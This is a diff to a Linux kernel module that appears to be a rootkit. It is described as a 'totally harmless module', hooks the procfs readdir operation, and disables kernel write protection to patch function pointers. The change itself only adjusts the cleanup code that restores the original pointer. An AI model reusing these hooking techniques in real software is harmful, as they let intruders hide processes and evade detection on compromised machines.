@@ -28,6 +28,7 @@ MODULE_DESCRIPTION("totally harmless module");
 
 static struct proc_dir_entry *proc_control;
 static struct file_operations *procfs_fops;
+
 static char internal_buffer[1024];
 
 static int (*procfs_readdir_proc)(struct file*, void*, filldir_t);
@@ -76,7 +77,6 @@ static int proc_init(void){
 	//its an easier and more flexible way than using ioctl
 
 	struct proc_dir_entry *parent;
-	struct file_operations *procfs_fops;
 
 	proc_control = create_proc_entry(CONTROL_FILE, 0666, NULL);
 
@@ -107,14 +107,18 @@ static int proc_init(void){
 
 static void proc_cleanup(void){
 
+	printk(KERN_INFO"%d", procfs_fops);
+
+	if(procfs_fops !=NULL){
+		disable_wp();
+		procfs_fops -> readdir = procfs_readdir_proc ;
+		enable_wp();printk(KERN_INFO"%p", procfs_fops);
+	}
+
+	printk(KERN_INFO"remove proc entry");
 	remove_proc_entry(CONTROL_FILE,NULL);
+	printk(KERN_INFO"successfull");
 
-//	WP_DISABLE();
-
-	disable_wp();
-	procfs_fops -> readdir = procfs_readdir_proc ;
-	enable_wp();
-//	WP_ENABLE();
 	
 
 }
